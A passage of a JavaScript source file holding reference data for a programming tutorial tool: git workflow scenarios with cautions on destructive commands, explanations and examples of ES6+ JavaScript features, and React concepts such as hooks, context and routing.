      step1: 'BE CAREFUL — destructive',
      step2: 'Discard unstaged changes: $ git checkout -- file.js',
      step3: 'Discard ALL local changes: $ git reset --hard',
      step4: 'Delete untracked files: $ git clean -fd',
      tips: 'Always commit or stash before destructive operations.',
      whenNot: 'If you\'re not sure, just commit your changes first.',
    },
    {
      scenario: 'You want to switch tasks but aren\'t ready to commit',
      step1: 'Stash: $ git stash',
      step2: 'Switch branches',
      step3: 'Do other work',
      step4: 'Come back + restore: $ git stash pop',
      tips: 'git stash list to see stashes. git stash apply keeps the stash; pop removes it.',
    },
    {
      scenario: 'You need to find when a bug was introduced',
      step1: 'Use git bisect',
      step2: 'Mark current as bad: $ git bisect bad',
      step3: 'Mark known-good commit as good: $ git bisect good abc1234',
      step4: 'Git checks out middle commit. Test it. $ git bisect good/bad based on result.',
      step5: 'Repeat. Git narrows down.',
      step6: 'Bisect finds offending commit. $ git bisect reset to finish.',
      tips: 'Bisect is a powerful tool for finding regression. O(log n) commits to check.',
    },
    {
      scenario: 'You want to combine multiple commits',
      step1: 'Interactive rebase: $ git rebase -i HEAD~3',
      step2: 'Editor opens. Mark commits as "squash" to combine into the one above.',
      step3: 'Save + close. Editor opens again for combined commit message.',
      step4: 'Edit message. Save + close.',
      tips: 'Only do this on local commits not pushed.',
      whenNot: 'Don\'t rebase pushed commits (rewrites history).',
    },
    {
      scenario: 'Someone else needs to take over your branch',
      step1: 'Push: $ git push origin feature/my-feature',
      step2: 'They pull: $ git fetch origin; git checkout feature/my-feature',
      step3: 'They continue from where you left off',
      tips: 'Communicate clearly about who has the branch. Avoid simultaneous edits.',
    },
    {
      scenario: 'Setting up Git for the first time',
      step1: 'Install Git from git-scm.com',
      step2: 'Configure name: $ git config --global user.name "Your Name"',
      step3: 'Configure email: $ git config --global user.email "you@example.com"',
      step4: 'Set default branch to main: $ git config --global init.defaultBranch main',
      step5: 'Set up SSH key for GitHub (optional)',
      tips: 'Use --global for system-wide. Without it, only applies to current repo.',
    },
    {
      scenario: 'Working on multiple projects',
      step1: 'Use directories for each project',
      step2: 'Each gets own git repo',
      step3: 'Use ssh-agent to manage keys',
      step4: 'Use git config to set per-repo user identity if needed',
      tips: 'For work + personal projects on same machine, use different SSH keys + git remotes.',
    },
  ];

  // ─── Modern JavaScript features (ES6+) reference ─────────────────
  var MODERN_JS = [
    {
      feature: 'let + const',
      esVersion: 'ES6 (2015)',
      whatItDoes: 'Block-scoped variable declarations. const = immutable binding.',
      whyAdded: 'var has confusing function scope + hoisting. let + const fix that.',
      example: '// let: block scoped, reassignable\nlet count = 0;\ncount = 1; // OK\n\n// const: block scoped, NOT reassignable\nconst PI = 3.14;\n// PI = 3.15; // ERROR\n\n// Note: const objects can be mutated:\nconst user = { name: "Alice" };\nuser.name = "Bob"; // OK\nuser = {}; // ERROR\n\n// Block scope:\nif (true) {\n  let x = 5;\n}\n// console.log(x); // ERROR — x is not defined here',
      whenUse: 'const by default. let when reassignment needed. NEVER var.',
      whenAvoid: 'var (legacy).',
      gotchas: 'Temporal Dead Zone: can\'t use let/const before declaration.',
      browserSupport: 'All modern browsers (IE11 with transpilation).',
    },
    {
      feature: 'Arrow functions',
      esVersion: 'ES6 (2015)',
      whatItDoes: 'Concise function syntax. Lexical this binding.',
      whyAdded: 'function() {}.bind(this) was clunky. Arrows simplify.',
      example: '// Old:\nfunction add(a, b) {\n  return a + b;\n}\n\n// Arrow:\nconst add = (a, b) => a + b;\n\n// Block body:\nconst process = (x) => {\n  const result = x * 2;\n  return result;\n};\n\n// Single arg can skip parens:\nconst double = x => x * 2;\n\n// No args needs parens:\nconst greet = () => "Hello";\n\n// Lexical this — useful in classes/methods:\nclass Timer {\n  start() {\n    setInterval(() => {\n      this.tick(); // \'this\' is the Timer instance\n    }, 1000);\n  }\n}',
      whenUse: 'For callbacks. For short functions. For lexical this.',
      whenAvoid: 'For object methods (lexical this is wrong). For constructors.',
      gotchas: 'Can\'t use as constructor (new arrow() fails). No own \'arguments\' object.',
      browserSupport: 'All modern browsers.',
    },
    {
      feature: 'Template literals',
      esVersion: 'ES6 (2015)',
      whatItDoes: 'String literals with interpolation + multiline.',
      whyAdded: 'String concatenation was ugly. Template literals are cleaner.',
      example: '// Interpolation:\nconst name = "Alice";\nconsole.log(`Hello, ${name}!`); // "Hello, Alice!"\n\n// Multiline:\nconst html = `\n  <div>\n    <h1>${title}</h1>\n  </div>\n`;\n\n// Expressions:\nconsole.log(`Sum: ${1 + 2}`); // "Sum: 3"\n\n// Tagged templates:\nfunction highlight(strings, ...values) {\n  return strings.reduce((acc, str, i) => \n    `${acc}${str}<mark>${values[i] || ""}</mark>`, ""\n  );\n}\nhighlight`Hello ${name}, you have ${count} items`;',
      whenUse: 'Almost always over " + ".',
      whenAvoid: 'When you specifically want " character + don\'t need interpolation.',
      gotchas: 'Backticks not single quotes! Escape via backslash: \\`',
      browserSupport: 'All modern browsers.',
    },
    {
      feature: 'Destructuring',
      esVersion: 'ES6 (2015)',
      whatItDoes: 'Extract values from arrays/objects into variables.',
      whyAdded: 'arr[0], arr[1] is ugly. Destructuring is cleaner.',
      example: '// Array:\nconst [first, second, third] = [1, 2, 3];\n// first = 1, second = 2, third = 3\n\n// Skip elements:\nconst [, , third] = [1, 2, 3];\n\n// Default values:\nconst [a = 1, b = 2] = [10]; // a = 10, b = 2\n\n// Object:\nconst { name, age } = { name: "Alice", age: 30 };\n// name = "Alice", age = 30\n\n// Rename:\nconst { name: userName } = { name: "Alice" };\n// userName = "Alice"\n\n// Default:\nconst { color = "blue" } = {}; // color = "blue"\n\n// Nested:\nconst { user: { name } } = { user: { name: "Alice" } };\n\n// Function parameters:\nfunction greet({ name, greeting = "Hello" }) {\n  return `${greeting}, ${name}!`;\n}\ngreet({ name: "Alice" }); // "Hello, Alice!"',
      whenUse: 'Almost always when extracting multiple values.',
      whenAvoid: 'For single value (just access it).',
      gotchas: 'Default values only apply for undefined, not null.',
      browserSupport: 'All modern browsers.',
    },
    {
      feature: 'Spread + rest operators',
      esVersion: 'ES6 (2015) + ES2018',
      whatItDoes: '... — spread: expand iterable into elements. rest: gather elements into array.',
      whyAdded: 'apply(), arguments was ugly. Spread + rest are cleaner.',
      example: '// Spread arrays:\nconst nums = [1, 2, 3];\nconst more = [0, ...nums, 4]; // [0, 1, 2, 3, 4]\n\n// Spread function args:\nMath.max(...nums); // Math.max(1, 2, 3)\n\n// Spread objects (ES2018):\nconst base = { a: 1, b: 2 };\nconst extended = { ...base, c: 3 }; // {a:1, b:2, c:3}\n\n// Rest parameters:\nfunction sum(...numbers) {\n  return numbers.reduce((a, b) => a + b, 0);\n}\nsum(1, 2, 3); // 6\n\n// Rest in destructuring:\nconst [first, ...rest] = [1, 2, 3, 4]; // first=1, rest=[2,3,4]\nconst { a, ...others } = { a: 1, b: 2, c: 3 }; // a=1, others={b:2,c:3}',
      whenUse: 'Constantly. Modern JS uses these everywhere.',
      whenAvoid: 'Spreading huge arrays/objects in tight loops (creates copies).',
      gotchas: 'Spread does shallow copy. Nested objects share references.',
      browserSupport: 'All modern browsers.',
    },
    {
      feature: 'Promises',
      esVersion: 'ES6 (2015)',
      whatItDoes: 'Represents the eventual completion or failure of an async operation.',
      whyAdded: 'Callback hell was real. Promises flatten async code.',
      example: '// Creating:\nconst promise = new Promise((resolve, reject) => {\n  // Async work\n  setTimeout(() => resolve("done"), 1000);\n  // Or: reject(new Error("failed"));\n});\n\n// Using:\npromise.then(result => console.log(result));\npromise.catch(err => console.error(err));\npromise.finally(() => console.log("cleanup"));\n\n// Chaining:\nfetch("/api")\n  .then(r => r.json())\n  .then(data => console.log(data))\n  .catch(err => console.error(err));\n\n// Parallel:\nPromise.all([fetch("/api/a"), fetch("/api/b")])\n  .then(([a, b]) => console.log(a, b));\n\n// Race:\nPromise.race([\n  fetch("/api"),\n  new Promise((_, rej) => setTimeout(() => rej("timeout"), 5000))\n]);',
      whenUse: 'For async operations.',
      whenAvoid: 'For synchronous code.',
      gotchas: 'Forgotten error handling = unhandled rejection. Use .catch() always.',
      browserSupport: 'All modern browsers.',
    },
    {
      feature: 'async/await',
      esVersion: 'ES2017',
      whatItDoes: 'Syntactic sugar for promises. Makes async code look synchronous.',
      whyAdded: 'Promise chains can be hard to read. async/await is cleaner.',
      example: '// Promise chain:\nfunction loadUser() {\n  return fetch("/api/user")\n    .then(r => r.json())\n    .then(user => fetch(`/api/posts/${user.id}`))\n    .then(r => r.json());\n}\n\n// async/await:\nasync function loadUser() {\n  const userResponse = await fetch("/api/user");\n  const user = await userResponse.json();\n  const postsResponse = await fetch(`/api/posts/${user.id}`);\n  const posts = await postsResponse.json();\n  return posts;\n}\n\n// Error handling:\nasync function fetchData() {\n  try {\n    const data = await fetch("/api/data");\n    return await data.json();\n  } catch (err) {\n    console.error(err);\n    return null;\n  }\n}\n\n// Parallel with Promise.all:\nasync function loadAll() {\n  const [user, posts] = await Promise.all([\n    fetchUser(),\n    fetchPosts()\n  ]);\n  return { user, posts };\n}',
      whenUse: 'For most async code. Cleaner than .then() chains.',
      whenAvoid: 'When you want to fire-and-forget (no need for await).',
      gotchas: 'await only works inside async functions. Sequential awaits are slow — use Promise.all for parallel.',
      browserSupport: 'All modern browsers.',
    },
    {
      feature: 'Modules (import/export)',
      esVersion: 'ES6 (2015)',
      whatItDoes: 'Native modules in JavaScript.',
      whyAdded: 'No native module system before. Each file was global.',
      example: '// math.js (exporting):\nexport const PI = 3.14;\nexport function add(a, b) { return a + b; }\nexport default class Calculator { /* ... */ }\n\n// app.js (importing):\nimport Calculator, { PI, add } from "./math.js";\n\n// Or import all:\nimport * as math from "./math.js";\nmath.add(1, 2);\n\n// Dynamic imports:\nconst mod = await import("./module.js");\nmod.something();\n\n// Re-export:\nexport { add, PI } from "./math.js";',
      whenUse: 'For organizing code into modules.',
      whenAvoid: 'In <script> tags without type="module" (won\'t work in browser).',
      gotchas: 'Need bundler (Webpack/Vite) for older browsers. Browsers need type="module".',
      browserSupport: 'All modern browsers + Node.js.',
    },
    {
      feature: 'Classes',
      esVersion: 'ES6 (2015)',
      whatItDoes: 'Syntactic sugar over prototypal inheritance.',
      whyAdded: 'OOP-style code was clunky. Classes provide familiar syntax.',
      example: 'class Animal {\n  constructor(name) {\n    this.name = name;\n  }\n  \n  speak() {\n    console.log(`${this.name} makes a sound`);\n  }\n  \n  static create(name) {\n    return new Animal(name);\n  }\n}\n\nclass Dog extends Animal {\n  constructor(name, breed) {\n    super(name); // Call parent\n    this.breed = breed;\n  }\n  \n  speak() {\n    super.speak(); // Call parent method\n    console.log(`${this.name} barks!`);\n  }\n}\n\nconst d = new Dog("Rex", "Lab");\nd.speak(); // "Rex makes a sound\\nRex barks!"',
      whenUse: 'For OOP-style code. Especially when extending.',
      whenAvoid: 'For simple data (use objects). Modern JS prefers functions + closures often.',
      gotchas: 'this binding inside methods can be tricky. Use arrow functions for handlers.',
      browserSupport: 'All modern browsers.',
    },
    {
      feature: 'Optional chaining (?.)',
      esVersion: 'ES2020',
      whatItDoes: 'Safely access nested properties — returns undefined if any link is null/undefined.',
      whyAdded: 'Defensive `&&` chains were verbose. ?. is cleaner.',
      example: '// Before:\nconst street = user && user.address && user.address.street;\n\n// After:\nconst street = user?.address?.street;\n\n// Works with method calls:\nconst result = obj.method?.(); // undefined if method doesn\'t exist\n\n// Works with arrays:\nconst item = arr?.[0]; // undefined if arr is null/undefined\n\n// Combined with default:\nconst name = user?.name ?? "Anonymous";',
      whenUse: 'For optional nested access.',
      whenAvoid: 'For required access (would mask bugs).',
      gotchas: 'Returns undefined for null too (different from && which returns null).',
      browserSupport: 'All modern browsers.',
    },
    {
      feature: 'Nullish coalescing (??)',
      esVersion: 'ES2020',
      whatItDoes: 'Return right side ONLY if left is null or undefined.',
      whyAdded: '|| returns right side for any falsy (0, "", false). ?? is more precise.',
      example: '// || treats falsy values as "missing":\nconst count = userCount || 10; // If userCount is 0, count becomes 10!\n\n// ?? only treats null/undefined as "missing":\nconst count = userCount ?? 10; // If userCount is 0, count is 0\n\n// Useful for defaults:\nconst theme = config?.theme ?? "light";\nconst maxRetries = options.retries ?? 3;',
      whenUse: 'For "use this if value is missing, else use as-is."',
      whenAvoid: 'When falsy values should also trigger default (use ||).',
      gotchas: 'Can\'t combine with || or && without parens (syntax error).',
      browserSupport: 'All modern browsers.',
    },
    {
      feature: 'Logical assignment operators',
      esVersion: 'ES2021',
      whatItDoes: 'Combine logical operator with assignment.',
      whyAdded: 'x = x && y was verbose.',
      example: '// ||= assigns if left is falsy:\nlet x = "";\nx ||= "default"; // x = "default"\n\n// &&= assigns if left is truthy:\nlet user = { name: "Alice" };\nuser.name &&= user.name.toUpperCase();\n\n// ??= assigns if left is null/undefined:\nlet config = { theme: null };\nconfig.theme ??= "light"; // config.theme = "light"',
      whenUse: 'For conditional assignment.',
      whenAvoid: 'When clarity matters more (sometimes explicit is better).',
      gotchas: 'Newer feature — older browsers may not support.',
      browserSupport: 'Modern browsers (2021+).',
    },
    {
      feature: 'Object.entries() / Object.keys() / Object.values()',
      esVersion: 'ES2017',
      whatItDoes: 'Iterate over object properties.',
      whyAdded: 'Iterating objects was awkward. These three methods fix it.',
      example: 'const obj = { a: 1, b: 2, c: 3 };\n\nObject.keys(obj); // ["a", "b", "c"]\nObject.values(obj); // [1, 2, 3]\nObject.entries(obj); // [["a", 1], ["b", 2], ["c", 3]]\n\n// Iterate:\nfor (const [key, value] of Object.entries(obj)) {\n  console.log(key, value);\n}\n\n// Transform object:\nconst doubled = Object.fromEntries(\n  Object.entries(obj).map(([k, v]) => [k, v * 2])\n);\n// doubled = { a: 2, b: 4, c: 6 }',
      whenUse: 'Whenever you need to iterate object properties.',
      whenAvoid: 'For arrays (use Array methods).',
      gotchas: 'Order is insertion order for string keys, sorted for numeric-like keys.',
      browserSupport: 'All modern browsers.',
    },
    {
      feature: 'Array methods: find, findIndex, includes',
      esVersion: 'ES2016/ES2015',
      whatItDoes: 'Modern array search methods.',
      whyAdded: 'indexOf was clunky. find + findIndex + includes are cleaner.',
      example: 'const users = [\n  { id: 1, name: "Alice" },\n  { id: 2, name: "Bob" }\n];\n\n// find — returns first match\nconst alice = users.find(u => u.name === "Alice");\n// alice = { id: 1, name: "Alice" }\n\n// findIndex — returns index\nconst idx = users.findIndex(u => u.id === 2);\n// idx = 1\n\n// includes — boolean check\nconst nums = [1, 2, 3];\nnums.includes(2); // true\nnums.includes(NaN); // works! (indexOf can\'t find NaN)',
      whenUse: 'For modern code.',
      whenAvoid: 'In legacy code that doesn\'t support these.',
      gotchas: 'find returns undefined (not null) if not found.',
      browserSupport: 'All modern browsers.',
    },
    {
      feature: 'String methods: padStart, padEnd, repeat, replaceAll',
      esVersion: 'ES2017/ES2015/ES2021',
      whatItDoes: 'Useful string methods.',
      whyAdded: 'Common operations that required custom code.',
      example: '// padStart, padEnd:\n"5".padStart(3, "0"); // "005"\n"abc".padEnd(7, "-"); // "abc----"\n\n// repeat:\n"=".repeat(10); // "=========="\n"-".repeat(0); // ""\n\n// replaceAll (ES2021):\n"foo foo foo".replaceAll("foo", "bar"); // "bar bar bar"\n// Before: "foo foo foo".replace(/foo/g, "bar")\n\n// trimStart, trimEnd (ES2019):\n"  hi  ".trimStart(); // "hi  "\n"  hi  ".trimEnd(); // "  hi"',
      whenUse: 'Convenience for common operations.',
      whenAvoid: 'In old browsers (use polyfill).',
      gotchas: 'padStart in old browsers needs polyfill.',
      browserSupport: 'Modern browsers.',
    },
    {
      feature: 'BigInt',
      esVersion: 'ES2020',
      whatItDoes: 'Integer type for arbitrarily large numbers.',
      whyAdded: 'Regular numbers only safe up to 2^53. BigInt allows arbitrary precision.',
      example: '// Regular number max safe:\nNumber.MAX_SAFE_INTEGER; // 9007199254740991\n\n// BigInt — no limit:\nconst big = 9007199254740992n; // n suffix\nconst bigger = BigInt("9007199254740993");\n\nconst sum = 5n + 6n; // 11n (both must be BigInt)\n// 5n + 6; // ERROR: can\'t mix\n\n// Math operations:\nbigger * 1000n; // works\n\n// Conversion:\nNumber(big); // converts to regular number (may lose precision)\nString(big); // string form',
      whenUse: 'For very large integers (timestamps, crypto, scientific).',
      whenAvoid: 'For normal math (regular numbers).',
      gotchas: 'Can\'t mix with regular numbers. Slower than regular numbers.',
      browserSupport: 'Modern browsers.',
    },
  ];

  // ─── React (popular framework) reference ─────────────────────────
  var REACT_REFERENCE = [
    {
      concept: 'Component',
      definition: 'A reusable, composable piece of UI defined as a function or class.',
      whatItDoes: 'Returns JSX representing the rendered output.',
      example: 'function Greeting({ name }) {\n  return <h1>Hello, {name}!</h1>;\n}\n\n// Use it:\n<Greeting name="Alice" />',
      whenUse: 'Whenever you have UI logic that\'s reusable.',
      whenAvoid: 'For trivial markup that\'s used once.',
      keyPoints: ['Components are pure functions of their props', 'Should not have side effects in render', 'Naming: PascalCase'],
      gotchas: 'Don\'t mutate props. Return a single root element (or fragment).',
    },
    {
      concept: 'Props',
      definition: 'Data passed from parent to child component (read-only).',
      whatItDoes: 'Configures the child\'s behavior + appearance.',
      example: 'function Button({ label, onClick, variant = "primary" }) {\n  return <button className={variant} onClick={onClick}>{label}</button>;\n}\n\n<Button label="Save" onClick={save} variant="primary" />',
      whenUse: 'Always — that\'s how you communicate from parent to child.',
      whenAvoid: 'Don\'t pass deeply nested objects when shallow would do (perf).',
      keyPoints: ['Props are read-only', 'Use destructuring for cleaner code', 'Default values via destructuring'],
      gotchas: 'Never mutate props.children. Don\'t spread untrusted props.',
    },
    {
      concept: 'State (useState)',
      definition: 'Component\'s mutable data that triggers re-renders when changed.',
      whatItDoes: 'Tracks data that changes over time + needs to be reflected in UI.',
      example: 'import { useState } from "react";\n\nfunction Counter() {\n  const [count, setCount] = useState(0);\n  return (\n    <button onClick={() => setCount(count + 1)}>Count: {count}</button>\n  );\n}\n\n// State updates can use callback:\nsetCount(prev => prev + 1); // Safer when depending on previous value',
      whenUse: 'For values that change over time within a component.',
      whenAvoid: 'For values that can be computed from props/state (use useMemo).',
      keyPoints: ['useState returns [value, setter]', 'Setter triggers re-render', 'Multiple setters batch in event handlers'],
      gotchas: 'Don\'t mutate state directly. Always use setter. Async setter — value doesn\'t update immediately.',
    },
    {
      concept: 'useEffect',
      definition: 'Hook for side effects (subscribing to data, network calls, DOM mutations).',
      whatItDoes: 'Runs after render. Cleans up on unmount or before next run.',
      example: 'import { useEffect, useState } from "react";\n\nfunction Timer() {\n  const [time, setTime] = useState(new Date());\n  \n  useEffect(() => {\n    const id = setInterval(() => setTime(new Date()), 1000);\n    return () => clearInterval(id); // Cleanup\n  }, []); // Empty deps = run once\n  \n  return <div>{time.toLocaleTimeString()}</div>;\n}',
      whenUse: 'For side effects: subscriptions, network, DOM manipulation, timers.',
      whenAvoid: 'For derived values (use useMemo). For event handlers (use onClick).',
      keyPoints: ['Empty deps [] = run on mount only', 'No deps = run after every render', 'With deps = run when deps change'],
      gotchas: 'Easy to create infinite loops. Forgetting cleanup = memory leak. Don\'t put async functions inside useEffect (use inner async).',
    },
    {
      concept: 'useRef',
      definition: 'Hook for mutable values that don\'t trigger re-renders.',
      whatItDoes: 'Returns object with .current property. Persists across renders.',
      example: 'import { useRef, useEffect } from "react";\n\nfunction AutoFocusInput() {\n  const inputRef = useRef(null);\n  \n  useEffect(() => {\n    inputRef.current.focus();\n  }, []);\n  \n  return <input ref={inputRef} />;\n}',
      whenUse: 'For DOM references. For values that need to persist but don\'t cause renders.',
      whenAvoid: 'For values that should trigger re-renders (use useState).',
      keyPoints: ['ref.current is mutable', 'Doesn\'t trigger re-render on change'],
      gotchas: 'Don\'t read ref.current during render (use in useEffect).',
    },
    {
      concept: 'useCallback',
      definition: 'Memoize a function so it doesn\'t change between renders unless dependencies change.',
      whatItDoes: 'Returns same function reference across renders (when deps unchanged).',
      example: 'import { useCallback, useState } from "react";\n\nfunction Parent() {\n  const [count, setCount] = useState(0);\n  \n  const handleClick = useCallback(() => {\n    console.log("clicked");\n  }, []); // Same function across renders\n  \n  return <Child onClick={handleClick} />;\n}',
      whenUse: 'When passing function to child component that uses React.memo.',
      whenAvoid: 'For trivial functions. Over-using hurts performance.',
      keyPoints: ['Returns memoized version of callback', 'Useful for performance optimization'],
      gotchas: 'Premature optimization. Often not needed.',
    },
    {
      concept: 'useMemo',
      definition: 'Memoize an expensive computation. Recompute only when deps change.',
      whatItDoes: 'Returns memoized value.',
      example: 'import { useMemo } from "react";\n\nfunction Component({ items, filter }) {\n  const filtered = useMemo(() => {\n    return items.filter(item => item.name.includes(filter));\n  }, [items, filter]);\n  \n  return <List items={filtered} />;\n}',
      whenUse: 'For expensive computations.',
      whenAvoid: 'For cheap calculations. Hurts performance if overused.',
      keyPoints: ['Recomputes only when deps change', 'Don\'t use for simple values'],
      gotchas: 'Profile before optimizing. Most apps don\'t need this.',
    },
    {
      concept: 'JSX',
      definition: 'JavaScript XML — syntax extension for writing HTML-like code in JS.',
      whatItDoes: 'Compiled to React.createElement() calls.',
      example: '// JSX:\nconst element = <div className="card">Hello!</div>;\n\n// Compiles to:\nconst element = React.createElement("div", { className: "card" }, "Hello!");\n\n// Attributes use camelCase:\nclassName not class\nonClick not onclick\n\n// Expressions in {}:\n<div>{user.name}</div>',
      whenUse: 'Throughout React components.',
      whenAvoid: 'In pure-JS files (need Babel/JSX transformer).',
      keyPoints: ['camelCase for attributes', 'class → className', 'for → htmlFor', 'Always return single root or fragment'],
      gotchas: 'self-closing tags need slash (<input />), capitalize component names',
    },
    {
      concept: 'Conditional rendering',
      definition: 'Render different content based on conditions.',
      whatItDoes: 'Common React pattern for showing/hiding parts of UI.',
      example: '// Ternary:\n{user ? <Welcome name={user.name} /> : <Login />}\n\n// && (short-circuit):\n{showAlert && <Alert message="!" />}\n\n// If statement before return:\nfunction Component({ status }) {\n  if (status === "loading") return <Spinner />;\n  if (status === "error") return <Error />;\n  return <Content />;\n}',
      whenUse: 'For UI that changes based on state.',
      whenAvoid: 'For very complex logic (extract to a helper).',
      keyPoints: ['Falsy values render nothing', '0 is rendered as "0" — watch out!', 'null + undefined render nothing'],
      gotchas: '0 && X displays 0. Always wrap in Boolean: Boolean(x) && X.',
    },
    {
      concept: 'Lists + keys',
      definition: 'Rendering lists of items. Keys help React identify which items changed.',
      whatItDoes: 'Map over array, return component for each.',
      example: 'function List({ items }) {\n  return (\n    <ul>\n      {items.map(item => (\n        <li key={item.id}>{item.name}</li>\n      ))}\n    </ul>\n  );\n}',
      whenUse: 'For any dynamic list.',
      whenAvoid: 'For fixed lists (use array literal).',
      keyPoints: ['Every list child needs a key', 'Keys should be unique + stable', 'Index as key is fine for static lists, BAD for dynamic'],
      gotchas: 'Using index as key when items reorder = bugs. Use a stable ID.',
    },
    {
      concept: 'Event handling',
      definition: 'Handling user events (clicks, typing, etc.) in React.',
      whatItDoes: 'Attach event handlers via JSX props.',
      example: '<button onClick={handleClick}>Click</button>\n<input onChange={handleChange} />\n<form onSubmit={handleSubmit}>\n  <button type="submit">Submit</button>\n</form>\n\nfunction handleSubmit(e) {\n  e.preventDefault();\n  console.log("submitted");\n}\n\nfunction handleChange(e) {\n  console.log(e.target.value);\n}',
      whenUse: 'For all user interactions.',
      whenAvoid: 'For things React doesn\'t handle (window events — use useEffect).',
      keyPoints: ['camelCase event names', 'Synthetic events (React wraps native)', 'Handler is a function, not a function call'],
      gotchas: 'onClick={handle()} calls immediately. Use onClick={handle} or onClick={() => handle()}',
    },
    {
      concept: 'React.memo',
      definition: 'Memoize a component — only re-render when props change.',
      whatItDoes: 'Wraps a component. Skip re-render if props are same as last time.',
      example: 'import { memo } from "react";\n\nconst ExpensiveComponent = memo(function ExpensiveComponent({ data }) {\n  // Heavy rendering logic\n  return <div>...</div>;\n});',
      whenUse: 'For expensive components that re-render often with same props.',
      whenAvoid: 'For most components. Premature optimization.',
      keyPoints: ['Shallow compare by default', 'Custom compare via second arg'],
      gotchas: 'Object/array props create new references each render — defeats memoization. Use useMemo for those.',
    },
    {
      concept: 'Custom hooks',
      definition: 'Reusable logic extracted into hook-like functions.',
      whatItDoes: 'Encapsulates stateful logic for reuse across components.',
      example: 'import { useState, useEffect } from "react";\n\nfunction useLocalStorage(key, initialValue) {\n  const [value, setValue] = useState(() => {\n    try {\n      const item = localStorage.getItem(key);\n      return item ? JSON.parse(item) : initialValue;\n    } catch (e) {\n      return initialValue;\n    }\n  });\n  \n  useEffect(() => {\n    localStorage.setItem(key, JSON.stringify(value));\n  }, [key, value]);\n  \n  return [value, setValue];\n}\n\n// Usage:\nfunction Profile() {\n  const [name, setName] = useLocalStorage("name", "");\n  return <input value={name} onChange={e => setName(e.target.value)} />;\n}',
      whenUse: 'When you have stateful logic that\'s reused across components.',
      whenAvoid: 'For trivial logic.',
      keyPoints: ['Must start with "use"', 'Can call other hooks', 'Naming convention: useFoo'],
      gotchas: 'Hooks must be called at top level (not in conditions/loops).',
    },
    {
      concept: 'Context (useContext)',
      definition: 'Pass data through component tree without prop drilling.',
      whatItDoes: 'Provides + consumes shared state across components.',
      example: 'import { createContext, useContext, useState } from "react";\n\nconst ThemeContext = createContext("light");\n\nfunction App() {\n  const [theme, setTheme] = useState("dark");\n  return (\n    <ThemeContext.Provider value={theme}>\n      <Header />\n    </ThemeContext.Provider>\n  );\n}\n\nfunction Header() {\n  const theme = useContext(ThemeContext);\n  return <div className={theme}>Header</div>;\n}',
      whenUse: 'For app-wide state (theme, user, locale).',
      whenAvoid: 'For frequently-changing data (causes all consumers to re-render).',
      keyPoints: ['Context.Provider wraps consumers', 'useContext reads value', 'Default value used if no Provider'],
      gotchas: 'Performance: every change re-renders all consumers. Split contexts for unrelated data.',
    },
    {
      concept: 'Forms (controlled vs uncontrolled)',
      definition: 'Controlled: React holds value. Uncontrolled: DOM holds value (ref).',
      whatItDoes: 'Manages form state.',
      example: '// Controlled (recommended):\nfunction Form() {\n  const [name, setName] = useState("");\n  return (\n    <form onSubmit={e => { e.preventDefault(); console.log(name); }}>\n      <input value={name} onChange={e => setName(e.target.value)} />\n      <button>Submit</button>\n    </form>\n  );\n}\n\n// Uncontrolled (less common):\nfunction Form() {\n  const inputRef = useRef();\n  return (\n    <form onSubmit={e => { e.preventDefault(); console.log(inputRef.current.value); }}>\n      <input ref={inputRef} defaultValue="initial" />\n      <button>Submit</button>\n    </form>\n  );\n}',
      whenUse: 'Controlled: most React forms. Uncontrolled: file inputs + simple forms.',
      whenAvoid: 'Uncontrolled: when you need to react to changes.',
      keyPoints: ['Controlled: value + onChange', 'Uncontrolled: ref + defaultValue', 'File inputs are always uncontrolled'],
      gotchas: 'Mixing controlled + uncontrolled bugs out.',
    },
    {
      concept: 'Routing (React Router)',
      definition: 'Client-side routing for single-page applications.',
      whatItDoes: 'Maps URLs to components.',
      example: 'import { BrowserRouter, Routes, Route, Link } from "react-router-dom";\n\nfunction App() {\n  return (\n    <BrowserRouter>\n      <nav>\n        <Link to="/">Home</Link>\n        <Link to="/about">About</Link>\n      </nav>\n      <Routes>\n        <Route path="/" element={<Home />} />\n        <Route path="/about" element={<About />} />\n        <Route path="/users/:id" element={<User />} />\n      </Routes>\n    </BrowserRouter>\n  );\n}',
      whenUse: 'For SPA navigation.',
      whenAvoid: 'For multi-page apps (use proper URLs).',
      keyPoints: ['BrowserRouter wraps app', 'Routes contain Route entries', 'Link instead of <a> for SPA navigation'],
      gotchas: 'External libraries — install separately. Different versions have different syntax (v6 vs v5).',
    },
    {
      concept: 'Error Boundaries',
      definition: 'Catch JavaScript errors in component tree + show fallback UI.',
      whatItDoes: 'Prevents component errors from crashing entire app.',
      example: 'class ErrorBoundary extends React.Component {\n  state = { hasError: false };\n  \n  static getDerivedStateFromError() {\n    return { hasError: true };\n  }\n  \n  componentDidCatch(error, info) {\n    console.error(error, info);\n  }\n  \n  render() {\n    if (this.state.hasError) {\n      return <h2>Something went wrong.</h2>;\n    }\n    return this.props.children;\n  }\n}\n\n// Usage:\n<ErrorBoundary>\n  <App />\n</ErrorBoundary>',
      whenUse: 'For production apps that need graceful failure.',
      whenAvoid: 'For dev — let errors propagate.',
      keyPoints: ['Class components only (no hooks-based version)', 'Catches errors in render + lifecycle', 'Doesn\'t catch async errors or event handlers'],
      gotchas: 'Only catches render errors. Wrap top-level + critical sections.',
    },
    {
      concept: 'React.lazy + Suspense',
      definition: 'Code splitting + loading states.',
      whatItDoes: 'Load components only when needed.',
      example: 'import { lazy, Suspense } from "react";\n\nconst HeavyComponent = lazy(() => import("./HeavyComponent"));\n\nfunction App() {\n  return (\n    <Suspense fallback={<Spinner />}>\n      <HeavyComponent />\n    </Suspense>\n  );\n}',
      whenUse: 'For rarely-used components (routes, modals).',
      whenAvoid: 'For everything (over-splitting hurts).',
      keyPoints: ['lazy returns a dynamic import', 'Suspense shows fallback during load', 'Code splitting requires bundler (Webpack, Vite)'],
      gotchas: 'Server-side rendering complications. Suspense for data fetching is experimental.',
    },
  ];

  // ─── Web standards + how browsers actually work ──────────────────
  var BROWSER_INTERNALS = [
    {
      topic: 'How browsers parse HTML',
      summary: 'When the browser receives HTML, it parses it into a DOM tree. Tokens flow through the parser, and HTML5 has a strict order of operations.',
      stages: [
        '1. Network: HTTP request → response body received as bytes',
        '2. Character encoding: bytes decoded to characters using charset',
        '3. Tokenization: characters → tokens (start tag, text, end tag, attribute)',
        '4. Tree construction: tokens → DOM tree nodes',
        '5. Parse blocking: scripts halt parsing unless async or defer',
      ],
      keyConcepts: {
        'speculativeParser': 'Browser pre-fetches resources (images, scripts) while parsing.',
        'parseBlocking': 'Synchronous <script> blocks DOM construction.',
        'criticalRenderingPath': 'HTML → DOM → CSSOM → Render Tree → Layout → Paint.',
      },
      whatYouCanControl: [
